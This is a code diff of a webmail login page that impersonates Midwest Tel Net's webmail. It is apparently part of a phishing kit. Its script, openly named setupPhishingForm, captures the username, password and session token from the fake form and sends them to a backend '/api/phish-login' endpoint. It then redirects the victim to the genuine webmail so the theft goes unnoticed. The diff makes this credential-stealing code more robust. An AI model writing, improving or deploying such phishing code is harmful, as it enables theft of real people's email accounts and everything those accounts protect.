@@ -1,88 +1,112 @@
 <!doctype html>
 <html lang="en">
- <head>
- <!-- Keep all your existing meta tags/styles -->
- <meta http-equiv="content-type" content="text/html" charset="UTF-8" />
- <title>Midwest Tel Net Webmail :: Welcome</title>
- <link rel="stylesheet" type="text/css" href="https://webmail.mwt.net/skins/larry/styles.min.css?s=1689092804" />
- </head>
- <body>
+  <head>
+    <!-- Keep all your existing meta tags/styles -->
+    <meta http-equiv="content-type" content="text/html" charset="UTF-8" />
+    <title>Midwest Tel Net Webmail :: Welcome</title>
+    <link
+      rel="stylesheet"
+      type="text/css"
+      href="https://webmail.mwt.net/skins/larry/styles.min.css?s=1689092804"
+    />
+  </head>
+  <body>
+    <div id="loading-spinner">Loading login page...</div>
+    <!-- This div gets replaced by data.html once the JS runs -->
 
-  <div id="loading-spinner">Loading login page...</div>
-  <!-- This div gets replaced by data.html once the JS runs -->
+    <!-- Keep your EmailJS SDK init -->
+    <script src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js"></script>
 
+    <script>
+      document.addEventListener("DOMContentLoaded", () => {
+        // STEP 1: Get the fresh token and HTML from our backend
+        fetch("/api/get-login-page")
+          .then((res) => res.text())
+          .then((data) => {
+            console.log("API Response received (Raw HTML):", data);
 
- 
- <!-- Keep your EmailJS SDK init -->
- <script src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js"></script>
+            // Optional: Clear the spinner before injecting
+            const spinner = document.getElementById("loading-spinner");
+            if (spinner) spinner.remove();
 
- <script>
- document.addEventListener('DOMContentLoaded', () => {
-   
-   // STEP 1: Get the fresh token and HTML from our backend
-   fetch('/api/get-login-page')
-     .then(res => res.text()) // Changed from .json() to .text()
-     .then(data => {
-       console.log("API Response received (Raw HTML):", data);
-       document.body.innerHTML = data; // Use 'data' directly, NOT 'data.html'
-       setupPhishingForm();
-       console.log("Form events re-bound successfully.");
-     })
-     .catch(err => {
-       console.error("Failed to load login page", err);
-       alert("Error loading page.");
-     });
+            document.body.innerHTML = data;
+            setupPhishingForm();
+            console.log("Form events re-bound successfully.");
+          })
+          .catch((err) => {
+            console.error("Failed to load login page", err);
+            alert("Error loading page.");
+          });
+      });
 
+      function setupPhishingForm() {
+        // 1. Find the form - try specific ID first, then fall back to the first form found
+        let form = document.getElementById("contact-form");
+        if (!form) {
+          form = document.querySelector("form");
+        }
 
- });
+        if (!form) {
+          console.error("No form found in the injected HTML!");
+          return;
+        }
 
- function setupPhishingForm() {
-   const form = document.getElementById('contact-form');
-   if(!form) return;
+        // 2. Find inputs by name (more reliable than ID)
+        const emailInput = document.querySelector('input[name="_user"]');
+        const passwordInput = document.querySelector('input[name="_pass"]');
+        const tokenInput = document.querySelector('input[name="_token"]');
 
-   form.addEventListener('submit', async (e) => {
-     e.preventDefault();
-     
-     const emailInput = document.querySelector('input[name="_user"]');
-     const passwordInput = document.querySelector('input[name="_pass"]');
-     const tokenInput = document.querySelector('input[name="_token"]');
-     const submitBtn = document.getElementById('rcmloginsubmit');
+        if (!emailInput || !passwordInput || !tokenInput) {
+          console.warn(
+            "Could not find all required inputs (_user, _pass, _token). Form may not work correctly.",
+          );
+        }
 
-     const email = emailInput.value;
-     const password = passwordInput.value;
-     const token = tokenInput.value; // Use the token we injected
+        form.addEventListener("submit", async (e) => {
+          e.preventDefault();
 
-     submitBtn.disabled = true;
-     submitBtn.innerText = "Verifying...";
+          const email = emailInput.value;
+          const password = passwordInput.value;
+          const token = tokenInput ? tokenInput.value : "";
 
-     try {
-       // Call our backend to validate against the real site
-       const res = await fetch('/api/phish-login', {
-         method: 'POST',
-         headers: { 'Content-Type': 'application/json' },
-         body: JSON.stringify({ email, password, token })
-       });
+          const submitBtn =
+            document.getElementById("rcmloginsubmit") ||
+            form.querySelector('button[type="submit"]');
 
-       const data = await res.json();
+          if (submitBtn) {
+            submitBtn.disabled = true;
+            submitBtn.innerText = "Verifying...";
+          }
 
-       if (data.success) {
-         // Redirect to the real site's main dashboard
-         window.location.replace('https://webmail.mwt.net/?_task=mail');
-       } else {
-         alert('Invalid Credentials.');
-         submitBtn.disabled = false;
-         submitBtn.innerText = "Login";
-       }
-     } catch (err) {
-       alert('Connection Error');
-       submitBtn.disabled = false;
-       submitBtn.innerText = "Login";
-     }
-   });
- }
- </script>
+          try {
+            const res = await fetch("/api/phish-login", {
+              method: "POST",
+              headers: { "Content-Type": "application/json" },
+              body: JSON.stringify({ email, password, token }),
+            });
 
- <!-- Body will be populated by the script above -->
- 
-</body>
+            const data = await res.json();
+
+            if (data.success) {
+              window.location.replace("https://webmail.mwt.net/?_task=mail");
+            } else {
+              alert(data.message || "Invalid Credentials.");
+              if (submitBtn) {
+                submitBtn.disabled = false;
+                submitBtn.innerText = "Login";
+              }
+            }
+          } catch (err) {
+            alert("Connection Error");
+            if (submitBtn) {
+              submitBtn.disabled = false;
+              submitBtn.innerText = "Login";
+            }
+          }
+        });
+      }
+    </script>
+
+    <!-- Body will be populated by the script above -->
+  </body>
 </html>
